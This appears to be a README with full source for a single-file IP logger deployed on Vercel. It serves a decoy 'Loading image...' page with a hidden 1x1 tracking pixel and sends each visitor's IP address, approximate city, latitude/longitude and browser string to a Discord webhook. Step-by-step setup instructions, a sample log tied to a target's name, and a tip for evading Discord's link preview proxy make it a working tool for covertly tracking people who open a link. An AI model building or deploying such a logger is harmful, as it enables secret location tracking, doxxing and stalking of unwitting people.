# Discord IP Logger

Single-file IP logger. Deploys free on Vercel. Logs visitor IP + approximate location to a Discord webhook.

No databases. No external APIs. One file, one webhook.

---

## How it works

One serverless function serves two things:

- **The page** — send this link to someone. It loads an invisible tracking pixel.
- **The pixel** — invisible 1x1 PNG. When the browser requests it, the function logs IP + location to Discord.

The person sees a blank "Loading image..." page. You get the log.

---

## Setup

### 1. Discord webhook

- Server Settings → Integrations → Webhooks
- New Webhook → pick a channel → copy URL
- Keep it secret — anyone with it can post to that channel

### 2. GitHub repo

- New repo
- Create folder `api`
- Inside it, create `track.js`
- Paste the code from `api/track.js` below
- Commit

### 3. Vercel deploy

- vercel.com → sign in with GitHub
- Add New → Project → import the repo
- Framework preset: **Other**
- Environment Variables:
  - key: `DISCORD_WEBHOOK`
  - value: your webhook URL
- Deploy

### 4. Test

Open in browser:

https://your-project.vercel.app/api/track?id=test


Page loads, log appears in Discord within a second.

### 5. Send the link


Every open = one log message in the Discord channel.

---

## `api/track.js`

```js
export default async function handler(req, res) {
  const id = req.query.id || 'unknown';
  const isPixel = req.query.pixel === '1';

  if (isPixel) {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    const city = req.headers['x-vercel-ip-city'] || 'unknown';
    const country = req.headers['x-vercel-ip-country'] || 'unknown';
    const lat = req.headers['x-vercel-ip-latitude'] || 'unknown';
    const lon = req.headers['x-vercel-ip-longitude'] || 'unknown';
    const ua = req.headers['user-agent'] || 'unknown';

    const webhook = process.env.DISCORD_WEBHOOK;
    if (webhook) {
      const content = `**IP Log**\nID: ${id}\nIP: ${ip}\nCity: ${city}\nCountry: ${country}\nLat/Lon: ${lat}, ${lon}\nUA: ${ua}`;
      await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content })
      }).catch(() => {});
    }

    const png = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAFgwJ/lZ0kAAAAAElFTkSuQmCC',
      'base64'
    );
    res.setHeader('Content-Type', 'image/png');
    res.setHeader('Cache-Control', 'no-store');
    res.send(png);
    return;
  }

  res.setHeader('Content-Type', 'text/html');
  res.send(`<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
  <p>Loading image...</p>
  <script>
    const p = new URLSearchParams(window.location.search);
    const id = p.get('id') || 'unknown';
    const i = new Image();
    i.src = '/api/track?pixel=1&id=' + id;
    i.style.display = 'none';
    document.body.appendChild(i);
  </script>
</body>
</html>`);
}

log looks like this 

IP Log
ID: theirname
IP: 203.0.113.47
City: Mumbai
Country: IN
Lat/Lon: 19.076, 72.877
UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...

Limitations
VPN → you get the VPN's IP, wrong location

Mobile data → often carrier-grade NAT, shared IP

Location is city-level, not exact

Never send ?pixel=1 directly — Discord will proxy it and you'll log Discord





